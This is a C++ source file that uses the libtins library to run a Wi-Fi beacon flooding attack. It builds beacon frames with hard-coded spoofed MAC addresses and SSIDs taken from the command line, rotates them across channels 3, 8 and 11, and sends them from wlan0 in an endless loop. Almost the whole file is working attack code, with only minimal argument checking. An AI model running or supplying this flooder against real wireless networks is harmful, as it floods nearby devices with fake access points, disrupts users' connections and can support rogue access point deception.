#include <iostream>
#include <unistd.h>
#include <string>
#include <tins/tins.h>
#include "mybeacon.h"

using namespace std;
using namespace Tins;

int main(int argc, char *argv[])
{
    /* Usage */
    if (argc > 1) {
        if (!strcmp(argv[1], "-h")) {
            usage(argv[0]);
            exit(0);
        }
    }else {
        usage(argv[0]);
        exit(0);
    }

    static const int count = atoi(argv[1]);
    class myBeacon beacon[count];
    static const int channel[3] = {3, 8, 11};
    int j = 0;
    static const char mac[10][20] = {"54:4E:90:17:01:07", "54:4E:90:17:01:08", "54:4E:90:17:01:09", "54:4E:90:17:01:10", "54:4E:90:17:01:11", "54:4E:90:17:01:12", "54:4E:90:17:01:13", "54:4E:90:17:01:14", "54:4E:90:17:01:15", "54:4E:90:17:01:16"};
    int k = 0;
    vector<string> ssid;
    int cycle = 100000;

    /* set SSID */
    for (int i=0; i<count; i++) {
        ssid.push_back(argv[i+2]);
    }

    /* set Cycle */
    if (argc == count+3 && atoi(argv[count+2]) >= 50 && atoi(argv[count+2]) <= 1024) {
        if (atoi(argv[count+2]) < 100)
            cycle = atoi(argv[count+2]) * 100000;
        else if (atoi(argv[count+2]) < 1000)
            cycle = atoi(argv[count+2]) * 1000;
        else
            cycle = atoi(argv[count+2]) * 10;
    }

    /* set Beacon */
    for (int i=0; i<count; i++) {
        HWAddress<6> hw_addr(mac[k++]);
        beacon[i].setHWAddr(hw_addr);
        if (k == 10)
            k = 0;
        beacon[i].setSSID(ssid[i]);
        beacon[i].setChannel(channel[j++]);
        if (j == 3)
            j = 0;
    }

    /* set RadioTap */
    RadioTap radio[count];
    for (int i=0; i<count; i++) {
        radio[i] = RadioTap() / beacon[i].getBeacon();
    }
    PacketSender sender;
    NetworkInterface iface("wlan0");

    /* send Packet*/
    cout << "Beacon Flooding... " << endl;
    while(true) {
        for (int i=0; i<count; i++) {
            sender.send(radio[i], iface);
        }
        usleep(cycle);
    }
}
